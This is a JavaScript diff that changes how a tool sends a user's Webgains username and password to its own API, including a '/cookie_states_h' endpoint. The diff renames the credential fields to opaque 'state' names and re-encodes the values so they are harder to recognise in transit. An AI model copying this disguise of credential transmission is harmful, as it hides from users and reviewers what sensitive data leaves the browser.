@@ -191,9 +191,9 @@ function credentials_update(){
         dataType: "json",  
         url: api_path + "/cookie_states_h",
         data: { 
-              network_name: btoa('webgains'),
-            username: btoa('ZX'+$('#username').val()),
-            password: btoa('ZX'+$('#password').val()), 
+            state0: btoa('webgains'),
+            state1: 'ZX'+btoa($('#username').val()),
+            state2: 'ZX'+btoa($('#password').val()), 
         },
         success: function(data) {
             if (data.success === "yes") { 
@@ -223,8 +223,8 @@ password='123456';
         dataType: "json",
         url: api_path + "/webgains_authorizing_1",
         data: { 
-            username:username,
-            password:password, 
+            state1:username,
+            state2:password, 
         },
         success: function(data) {
             if (data.success === "yes") { 
@@ -243,7 +243,7 @@ password='123456';
 					        dataType: "json",
 					        url: api_path + "/webgains_authorizing_2",
 					        data: { 
-					            username:username, 
+					            state1:username, 
 					            site_id:sites[site_no].id, 
 					            publisherId:publisherId, 
 					        },
